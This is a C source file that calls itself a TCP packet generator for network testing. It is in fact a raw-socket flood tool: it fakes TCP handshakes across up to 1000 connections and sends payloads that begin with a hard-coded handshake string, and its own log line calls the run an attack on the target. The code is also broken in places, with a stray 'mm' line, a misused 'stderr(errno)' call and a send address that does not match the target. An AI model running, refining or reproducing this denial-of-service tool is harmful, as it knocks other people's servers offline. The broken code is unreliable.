// SPDX-License-Identifier: MIT
// Enhanced TCP packet generator for network testing
// Improvements: input validation, error handling, modularity, logging
// Compilation: gcc -O3 -o tcp_packet_generator tcp_packet_generator.c -lpthread

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <assert.h>
#include <fcntl.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netpacket/packet.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h> // Added for va_list, va_start, va_end

// Constants
#define NANOS 1000000000
#define BUFSIZE 4096
#define VLEN 5
#define MAX_CONS 1000
#define MIN_PPS 1
#define MAX_PPS 1000000
#define MIN_DATA_SIZE 1
#define MAX_DATA_SIZE 1400

// Global configuration
struct config {
    int data_size;
    int cons;
    int pps;
    in_addr_t dest_addr;
    uint16_t dest_port;
};

// Structure for connection state
struct connection {
    int fd;
    in_addr_t saddr;
    in_addr_t daddr;
    uint16_t sport;
    uint16_t dport;
    uint32_t seq;
    uint32_t ack;
    uint32_t sseq;
    uint8_t state;
    uint32_t sent;
    uint64_t time;
    struct sockaddr_in addr;
    uint32_t window;
    uint8_t tries;
    uint8_t resets;
    uint32_t pending;
    uint32_t tsval;
    uint32_t tsecr;
    uint64_t trip;
    uint8_t re;
    uint64_t resp;
    uint16_t fake_win;
    uint8_t scaling;
    uint64_t rett;
};

// Pseudo-header for TCP checksum
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

// Logging function
void log_message(const char *level, const char *format, ...) {
    va_list args;
    char timestamp[32];
    time_t now = time(NULL);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    fprintf(stderr, "[%s] %s: ", timestamp, level);
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "\n");
}

// Get current time in microseconds
uint64_t mytime(void) {
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) == -1) {
        log_message("ERROR", "Failed to get time: %s", strerror(errno));
        exit(1);
    }
    return (uint64_t)(NANOS * ts.tv_sec + ts.tv_nsec);
}

// Calculate checksum
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

// Convert binary to hex
void tohex(unsigned char *in, size_t insz, char *out, size_t outsz) {
    unsigned char *pin = in;
    const char *hex = "0123456789ABCDEF";
    char *pout = out;
    for (; pin < in + insz && pout + 2 < out + outsz; pout += 2, pin++) {
        pout[0] = hex[(*pin >> 4) & 0xF];
        pout[1] = hex[*pin & 0xF];
    }
    *pout = '\0';
}

// Custom strtok
char *strtokm(char *input, char *delimiter, char **string) {
    if (input != NULL) *string = input;
    if (*string == NULL) return NULL;

    char *end = strstr(*string, delimiter);
    if (end == NULL) {
        char *temp = *string;
        *string = NULL;
        return temp;
    }

    char *temp = *string;
    *end = '\0';
    *string = end + strlen(delimiter);
    return temp;
}

// Build TCP packet
int tcp_packet(char *datagram, struct connection *conn, uint32_t src, uint32_t dst,
               uint16_t sport, uint16_t dport, uint32_t seq, uint32_t ack,
               uint8_t flags, char *data, size_t data_len) {
    conn->trip = mytime() / 1000000;
    uint8_t optsize = (flags & TH_SYN) ? 20 : 12;
    uint16_t tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len + optsize;

    struct iphdr *iph = (struct iphdr *)datagram;
    iph->version = 4;
    iph->ihl = 5;
    iph->frag_off = htons(IP_DF);
    iph->ttl = 64;
    iph->tos = 0;
    iph->tot_len = tot_len;
    iph->id = htons(10000 + rand() % 55535);
    iph->check = 0;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = src;
    iph->daddr = dst;

    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    tcph->source = sport;
    mm
    tcph->dest = dport;
    tcph->seq = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff = 5 + optsize / 4;
    tcph->syn = (flags & TH_SYN) ? 1 : 0;
    tcph->ack = (flags & TH_ACK) ? 1 : 0;
    tcph->psh = (flags & TH_PUSH) ? 1 : 0;
    tcph->fin = (flags & TH_FIN) ? 1 : 0;
    tcph->rst = 0;
    tcph->urg = 0;
    tcph->window = htons(32168 + (rand() % 22447));
    tcph->urg_ptr = 0;
    tcph->check = 0;

    memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + optsize, data, data_len);

    uint32_t tsval = htonl(conn->tsval);
    uint32_t tsecr = htonl(conn->tsecr);

    if (flags & TH_SYN) {
        uint16_t mss = htons(1460);
        uint8_t scaling = 7;
        char optss[20];
        memcpy(optss, "\x02\x04\x05\x64\x01\x01\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x01\x03\x03\x07", 20);
        memcpy(optss + 2, &mss, 2);
        optss[19] = scaling;
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr), optss, 20);
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + 8, &tsval, 4);
    } else {
        uint8_t opts[12] = {0x01, 0x01, 0x08, 0x0a};
        memcpy(opts + 4, &tsval, 4);
        memcpy(opts + 8, &tsecr, 4);
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr), opts, 12);
    }

    struct pseudo_header psh = {
        .source_address = iph->saddr,
        .dest_address = iph->daddr,
        .placeholder = 0,
        .protocol = IPPROTO_TCP,
        .tcp_length = htons(sizeof(struct tcphdr) + data_len + optsize)
    };

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len + optsize;
    char *pseudogram = malloc(psize);
    if (!pseudogram) {
        log_message("ERROR", "Failed to allocate memory for pseudogram");
        exit(1);
    }
    memset(pseudogram, 0, psize);
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + data_len + optsize);
    iph->check = 0;
    tcph->check = csum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    return tot_len;
}

// Validate configuration
int validate_config(struct config *cfg) {
    if (cfg->cons < 1 || cfg->cons > MAX_CONS) {
        log_message("ERROR", "Connections must be between 1 and %d", MAX_CONS);
        return 0;
    }
    if (cfg->pps < MIN_PPS || cfg->pps > MAX_PPS) {
        log_message("ERROR", "PPS must be between %d and %d", MIN_PPS, MAX_PPS);
        return 0;
    }
    if (cfg->data_size < MIN_DATA_SIZE || cfg->data_size > MAX_DATA_SIZE) {
        log_message("ERROR", "Data size must be between %d and %d", MIN_DATA_SIZE, MAX_DATA_SIZE);
        return 0;
    }
    if (cfg->dest_addr == 0) {
        log_message("ERROR", "Invalid destination IP address");
        return 0;
    }
    if (cfg->dest_port == 0) {
        log_message("ERROR", "Invalid destination port");
        return 0;
    }
    return 1;
}

// Initialize socket
int init_socket(void) {
    int raw_fd = socket(AF_INET, SOCK_RAW | SOCK_NONBLOCK, IPPROTO_TCP);
    if (raw_fd < 0) {
        log_message("ERROR", "Failed to create socket: %s", strerror(errno));
        return -1;
    }

    int one = 1;
    if (setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        log_message("ERROR", "Failed to set IP_HDRINCL: %s", strerror(errno));
        close(raw_fd);
        return -1;
    }

    return raw_fd;
}

// Send data packets
void send_data_packets(struct config *cfg, struct connection *conns, int raw_fd, int *active, uint64_t *delay, uint64_t *conni, double *bandwidth, uint32_t *sends, uint32_t *sentt, int fdr) {
    if (*active <= 0 || mytime() - *delay < (uint64_t)(NANOS / cfg->pps)) return;

    *delay = mytime();
    struct connection *conn = &conns[*conni % cfg->cons];
    if (conn->state == 2) {
        if (mytime() - conn->resp >= NANOS && cfg->data_size < 1333) {
            conn->state = 0;
            (*active)--;
            return;
        }

        char b[1500];
        if (read(fdr, b, 1500) < 0) {
            log_message("ERROR", "Failed to read from /dev/urandom: %s", strerror(errno));
            return;
        }
        memcpy(b, "\x19\x00\xd4\x02\x12\x33\x31\x2e\x32\x31\x34\x2e\x32\x34\x34\x2e\x31\x39\x00\x46\x4d\x4c\x00\x63\xdd\x01\x01\x00\x11\x22\x33", 31);

        char datagram[1500];
        int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                      conn->sport, conn->dport, conn->seq, conn->ack,
                                      TH_ACK | TH_PUSH, b, cfg->data_size);
        if (sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in)) < 0) {
            log_message("WARNING", "Failed to send packet: %s", strerror(errno));
        }
        *bandwidth += datagram_len;
        (*sentt)++;
        (*sends)++;
        conn->seq += cfg->data_size;
    }
    (*conni)++;
}

// Manage connections
void manage_connections(struct config *cfg, struct connection *conns, int raw_fd, int *active, uint64_t *newDelay, double *bandwidth, uint32_t *sends, uint32_t *sentt) {
    if (mytime() - *newDelay < 80000000) return;
    *newDelay = mytime();

    for (int i = 0; i < cfg->cons; i++) {
        struct connection *conn = &conns[i];
        if (conn->state > 1 || (conn->state == 1 && mytime() - conn->time < NANOS)) continue;

        int cfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
        if (cfd < 0) {
            log_message("ERROR", "Failed to create socket for local address: %s", strerror(errno));
            continue;
        }

        struct sockaddr_in addr = { .sin_family = AF_INET, .sin_addr.s_addr = inet_addr("1.1.1.1"), .sin_port = htons(80) };
        struct sockaddr_in laddr = {0};
        if (connect(cfd, (struct sockaddr *)&addr, sizeof(addr)) < 0 && errno != EINPROGRESS) {
            log_message("WARNING", "Failed to connect for local address: %s", strerror(errno));
            close(cfd);
            continue;
        }

        int l = sizeof(laddr);
        if (getsockname(cfd, (struct sockaddr *)&laddr, &l) < 0) {
            log_message("WARNING", "Failed to get local address: %s", stderr(errno));
            close(cfd);
            continue;
        }
        close(cfd);

        conn->saddr = laddr.sin_addr.s_addr;
        conn->sport = rand() % 0xFFFF;
        conn->daddr = cfg->dest_addr;
        conn->dport = cfg->dest_port;
        conn->state = 0;
        memcpy(&conn->addr, &addr, sizeof(addr));
        conn->tsval = 124127841 + (rand() % 124127841);
        conn->tsecr = 0;
        conn->seq = 1247124 + rand() % 127849214;
        conn->ack = 0;

        char datagram[1500];
        int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                      conn->sport, conn->dport, conn->seq, conn->ack,
                                      TH_SYN, "", 0);
        conn->state = 1;
        conn->time = mytime();
        *bandwidth += datagram_len;
        if (sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in)) < 0) {
            log_message("WARNING", "Failed to send SYN packet: %s", strerror(errno));
        }

        if (cfg->data_size == 1333) {
            conn->seq = rand();
            conn->ack = rand();
            conn->state = 2;
            (*active)++;
            conn->window = 64400 * (1 << 7);
            conn->scaling = 7;
            datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                      conn->sport, conn->dport, conn->seq, conn->ack,
                                      TH_ACK, "", 0);
            if (sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in)) < 0) {
                log_message("WARNING", "Failed to send ACK packet: %s", strerror(errno));
            }
            *bandwidth += datagram_len;
            (*sentt)++;
            (*sends)++;
        }
    }
}

// Receive packets
void receive_packets(struct config *cfg, struct connection *conns, int raw_fd, int *active, double *bandwidth, uint32_t *sends, uint32_t *sentt, uint32_t *recvs) {
    struct mmsghdr msgs[VLEN];
    struct iovec iovecs[VLEN];
    char bufs[VLEN][BUFSIZE + 1];
    memset(msgs, 0, sizeof(msgs));
    for (int i = 0; i < VLEN; i++) {
        iovecs[i].iov_base = bufs[i];
        iovecs[i].iov_len = BUFSIZE;
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    struct timespec timeout = { .tv_sec = 0, .tv_nsec = 0 };
    int retval;
    do {
        retval = recvmmsg(raw_fd, msgs, VLEN, MSG_DONTWAIT, &timeout);
        if (retval < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                log_message("WARNING", "Failed to receive packets: %s", strerror(errno));
            }
            break;
        }

        for (int i = 0; i < retval; i++) {
            int rcvd = msgs[i].msg_len;
            char *buf = bufs[i];
            if (rcvd <= 20) continue;

            struct iphdr *iph = (struct iphdr *)buf;
            if (iph->protocol != IPPROTO_TCP || iph->saddr != cfg->dest_addr) continue;

            (*recvs)++;
            struct tcphdr *tcph = (struct tcphdr *)(buf + sizeof(struct iphdr));

            for (int j = 0; j < cfg->cons; j++) {
                struct connection *conn = &conns[j];
                if (conn->state == 0 || tcph->source != cfg->dest_port || tcph->dest != conn->sport) continue;

                conn->resp = mytime();
                if (tcph->ack) {
                    uint8_t *p = (uint8_t *)tcph + 20;
                    uint8_t *end = (uint8_t *)tcph + tcph->doff * 4;
                    while (p < end) {
                        uint8_t kind = *p++;
                        if (kind == 0) break;
                        if (kind == 1) continue;
                        uint8_t size = *p++;
                        if (kind == 8) {
                            conn->tsecr = ntohl(*(uint32_t *)p);
                            conn->tsval = conn->tsecr + 1;
                        }
                        p += (size - 2);
                    }

                    if (tcph->syn) {
                        uint8_t scaling = 1;
                        p = (uint8_t *)tcph + 20;
                        end = (uint8_t *)tcph + tcph->doff * 4;
                        while (p < end) {
                            uint8_t kind = *p++;
                            if (kind == 0) break;
                            if (kind == 1) continue;
                            uint8_t size = *p++;
                            if (kind == 3) scaling = *p;
                            p += (size - 2);
                        }

                        conn->seq = ntohl(tcph->ack_seq);
                        conn->ack = ntohl(tcph->seq) + 1;
                        conn->state = 2;
                        conn->rett = mytime();
                        (*active)++;
                        conn->window = ntohs(tcph->window) * (1 << scaling);
                        conn->scaling = scaling;

                        char datagram[1500];
                        int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                                      conn->sport, conn->dport, conn->seq, conn->ack,
                                                      TH_ACK, "", 0);
                        if (sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in)) < 0) {
                            log_message("WARNING", "Failed to send ACK packet: %s", strerror(errno));
                        }
                        *bandwidth += datagram_len;
                        (*sentt)++;
                        (*sends)++;
                    }

                    int tcpdatalen = ntohs(iph->tot_len) - (tcph->doff * 4) - (iph->ihl * 4);
                    if (tcpdatalen > 0 && mytime() - conn->rett > 500000000) {
                        conn->rett = mytime();
                        conn->ack += tcpdatalen;
                        char datagram[1500];
                        int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                                      conn->sport, conn->dport, conn->seq, conn->ack,
                                                      TH_ACK, "", 0);
                        if (sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in)) < 0) {
                            log_message("WARNING", "Failed to send ACK packet: %s", strerror(errno));
                        }
                        *bandwidth += datagram_len;
                        (*sentt)++;
                        (*sends)++;
                    }
                } else if (tcph->rst) {
                    if (conn->resets++ >= 10000) {
                        conn->state = 0;
                        conn->resets = 0;
                        (*active)--;
                    }
                }
                break;
            }
        }
    } while (retval == VLEN);
}

// Main function
int main(int argc, char *argv[]) {
    setbuf(stdout, NULL);
    srand(time(NULL));

    if (argc != 6) {
        log_message("ERROR", "Usage: %s <IP> <PORT> <CONS> <SIZE> <PPS>", argv[0]);
        return 1;
    }

    struct config cfg = {0};
    cfg.dest_addr = inet_addr(argv[1]);
    cfg.dest_port = htons(atoi(argv[2]));
    cfg.cons = atoi(argv[3]);
    cfg.data_size = atoi(argv[4]);
    cfg.pps = atoi(argv[5]);

    if (!validate_config(&cfg)) return 1;

    log_message("INFO", "Starting attack on %s:%d | Connections: %d | Size: %d bytes | PPS: %d",
                argv[1], ntohs(cfg.dest_port), cfg.cons, cfg.data_size, cfg.pps);

    int raw_fd = init_socket();
    if (raw_fd < 0) return 1;

    int fdr = open("/dev/urandom", O_RDONLY);
    if (fdr < 0) {
        log_message("ERROR", "Failed to open /dev/urandom: %s", strerror(errno));
        close(raw_fd);
        return 1;
    }

    struct connection conns[MAX_CONS];
    memset(conns, 0, sizeof(conns));
    uint64_t send_time = mytime(), delay = 0, newDelay = 0, conni = 0;
    uint32_t sends = 0, sentt = 0, recvs = 0;
    double bandwidth = 0;
    int active = 0;

    while (1) {
        uint64_t now = mytime();
        if (now - send_time >= NANOS) {
            log_message("INFO", "Sends=%u PPS=%u Recvs=%u Cons=%d Bandwidth=%.2fMbit/s",
                        sends, cfg.pps, recvs, cfg.cons, (bandwidth / 1024.0 / 1024.0) * 8.0);
            sends = 0;
            recvs = 0;
            bandwidth = 0;
            send_time = now;
        }

        send_data_packets(&cfg, conns, raw_fd, &active, &delay, &conni, &bandwidth, &sends, &sentt, fdr);
        manage_connections(&cfg, conns, raw_fd, &active, &newDelay, &bandwidth, &sends, &sentt);
        receive_packets(&cfg, conns, raw_fd, &active, &bandwidth, &sends, &sentt, &recvs);
    }

    close(fdr);
    close(raw_fd);
    return 0;
}